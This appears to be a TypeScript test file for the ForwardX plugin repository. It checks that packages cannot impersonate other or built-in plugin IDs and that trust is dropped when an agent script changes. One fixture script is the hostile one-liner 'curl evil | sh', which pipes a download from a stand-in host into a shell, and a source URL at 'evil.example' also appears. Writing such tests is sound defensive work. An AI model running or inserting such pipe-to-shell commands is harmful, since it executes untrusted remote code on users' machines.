import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

/*
  第三方插件商店的条目不能借一个包冒充别的插件（尤其是内置插件）：
  包里声明的 ID 必须等于条目 ID；来源不是官方仓库时，内置 ID 一律拒绝。
*/
test("store installs reject packages whose manifest id does not match, and never overwrite built-ins", () => {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), "forwardx-plugin-identity-"));
  const packageDir = path.join(directory, "pkg");
  fs.mkdirSync(packageDir);
  const makePackage = (id: string) => {
    fs.writeFileSync(path.join(packageDir, "forwardx-plugin.json"), JSON.stringify({
      id,
      name: "Nice plugin",
      version: "1.0.0",
      description: "test",
    }));
    const archive = path.join(directory, `${id}.tar.gz`);
    const tar = spawnSync("tar", ["-czf", archive, "-C", packageDir, "forwardx-plugin.json"], { encoding: "utf8" });
    assert.equal(tar.status, 0, tar.stderr);
    return archive;
  };
  const nicePackage = makePackage("nice-plugin");
  const builtinPackage = makePackage("china-region-whitelist");

  const script = String.raw`
    import assert from "node:assert/strict";
    import fs from "node:fs";
    import path from "node:path";
    import { pathToFileURL } from "node:url";

    const moduleUrl = (file) => pathToFileURL(path.join(process.cwd(), file)).href;
    const runtime = await import(moduleUrl("server/dbRuntime.ts"));
    const schema = await import(moduleUrl("server/dbSchema.ts"));
    const plugins = await import(moduleUrl("server/repositories/pluginRepository.ts"));
    try {
      await runtime.connectDatabase({ type: "sqlite", sqlite: { path: process.env.FORWARDX_TEST_DB } });
      await schema.ensureDatabaseSchema();

      await assert.rejects(
        () => plugins.installPluginFromPackage({
          content: fs.readFileSync(process.env.BUILTIN_PACKAGE),
          fileName: "x.tar.gz",
          sourceType: "github",
          sourceUrl: "https://evil.example/x.tar.gz",
          expectedId: "nice-plugin",
        }),
        /不一致/,
        "a store item must not install a package that declares another plugin id",
      );
      await assert.rejects(
        () => plugins.installPluginFromPackage({
          content: fs.readFileSync(process.env.BUILTIN_PACKAGE),
          fileName: "x.tar.gz",
          sourceType: "github",
          sourceUrl: "https://evil.example/x.tar.gz",
        }),
        /内置插件保留标识/,
        "a built-in id from a non-official source must be refused",
      );
      const installed = await plugins.installPluginFromPackage({
        content: fs.readFileSync(process.env.NICE_PACKAGE),
        fileName: "x.tar.gz",
        sourceType: "github",
        sourceUrl: "https://example.com/nice.tar.gz",
        expectedId: "nice-plugin",
      });
      assert.equal(installed?.pluginId || installed?.id, "nice-plugin");
    } finally {
      await runtime.closeDatabase().catch(() => undefined);
    }
  `;

  try {
    const result = spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "--eval", script], {
      cwd: process.cwd(),
      env: {
        ...process.env,
        DATABASE_TYPE: "sqlite",
        FORWARDX_TEST_DB: path.join(directory, "plugins.db"),
        FORWARDX_LOG_DIR: path.join(directory, "logs"),
        NICE_PACKAGE: nicePackage,
        BUILTIN_PACKAGE: builtinPackage,
      },
      encoding: "utf8",
      timeout: 60_000,
    });
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
});

test("a trusted plugin loses trust when its agent entry script content changes", () => {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), "forwardx-plugin-trust-"));
  const packageDir = path.join(directory, "pkg");
  fs.mkdirSync(packageDir);
  const makePackage = (name: string, script: string) => {
    fs.writeFileSync(path.join(packageDir, "forwardx-plugin.json"), JSON.stringify({
      id: "trust-demo",
      name: "Trust demo",
      version: "1.0.0",
      description: "test",
      permissions: ["agent:read", "agent:write"],
      actions: [{
        id: "run",
        label: "run",
        type: "agent.request",
        intent: "execute",
        agent: { executor: "script", interpreter: "bash", target: "selected-hosts", entry: "run.sh", arguments: [], timeoutMs: 15000 },
      }],
    }));
    fs.writeFileSync(path.join(packageDir, "run.sh"), script);
    const archive = path.join(directory, `${name}.tar.gz`);
    const tar = spawnSync("tar", ["-czf", archive, "-C", packageDir, "forwardx-plugin.json", "run.sh"], { encoding: "utf8" });
    assert.equal(tar.status, 0, tar.stderr);
    return archive;
  };
  const v1 = makePackage("v1", "echo hello\n");
  const v2same = makePackage("v2same", "echo hello\n");
  const v3changed = makePackage("v3changed", "curl evil | sh\n");

  const script = String.raw`
    import assert from "node:assert/strict";
    import fs from "node:fs";
    import path from "node:path";
    import { pathToFileURL } from "node:url";
    const moduleUrl = (file) => pathToFileURL(path.join(process.cwd(), file)).href;
    const runtime = await import(moduleUrl("server/dbRuntime.ts"));
    const schema = await import(moduleUrl("server/dbSchema.ts"));
    const plugins = await import(moduleUrl("server/repositories/pluginRepository.ts"));
    const install = (file) => plugins.installPluginFromPackage({ content: fs.readFileSync(file), fileName: "p.tar.gz", sourceType: "upload" });
    const trusted = async () => {
      const [row] = await runtime.queryRaw('SELECT "trusted" FROM "plugins" WHERE "pluginId" = ?', ["trust-demo"]);
      return Number(row?.trusted) === 1 || row?.trusted === true;
    };
    try {
      await runtime.connectDatabase({ type: "sqlite", sqlite: { path: process.env.FORWARDX_TEST_DB } });
      await schema.ensureDatabaseSchema();
      await install(process.env.V1);
      await plugins.setPluginTrusted("trust-demo", true);
      assert.equal(await trusted(), true);
      await install(process.env.V2SAME);
      assert.equal(await trusted(), true, "re-installing identical scripts keeps trust");
      await install(process.env.V3CHANGED);
      assert.equal(await trusted(), false, "a changed agent entry script must drop trust");
    } finally {
      await runtime.closeDatabase().catch(() => undefined);
    }
  `;
  try {
    const result = spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "--eval", script], {
      cwd: process.cwd(),
      env: {
        ...process.env,
        DATABASE_TYPE: "sqlite",
        FORWARDX_TEST_DB: path.join(directory, "plugins.db"),
        FORWARDX_LOG_DIR: path.join(directory, "logs"),
        V1: v1,
        V2SAME: v2same,
        V3CHANGED: v3changed,
      },
      encoding: "utf8",
      timeout: 60_000,
    });
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
});
